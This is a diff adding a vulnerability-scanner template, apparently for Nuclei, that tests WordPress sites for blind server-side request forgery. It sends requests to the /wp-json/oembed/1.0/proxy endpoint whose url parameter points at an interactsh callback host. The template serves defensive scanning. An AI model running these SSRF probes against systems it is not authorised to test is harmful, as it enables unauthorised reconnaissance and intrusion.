@@ -1,0 +1,26 @@
+id: wp-json-blind-ssrf
+
+info:
+  author: osamahamad
+  name: BLIND SSRF via /wp-json/oembed/1.0/proxy
+  severity: critical
+  reference: https://github.com/incogbyte/quickpress/blob/master/core/req.go
+  tags: wordpress,custom
+
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-json/oembed/1.0/proxy?url={{interactsh-url}}"
+      - "{{BaseURL}}/wp/wp-json/oembed/1.0/proxy?url={{interactsh-url}}"
+      - "{{BaseURL}}/wordpress/wp-json/oembed/1.0/proxy?url={{interactsh-url}}"
+      - "{{BaseURL}}/wp/wp-json/oembed/1.0/proxy?url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/wordpress/wp-json/oembed/1.0/proxy?url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/wp-json/oembed/1.0/proxy?url=http://{{interactsh-url}}"
+      - "{{BaseURL}}/wp-json/oembed/1.0/proxy?url={{Hostname}}.{{interactsh-url}}"   
+
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - http
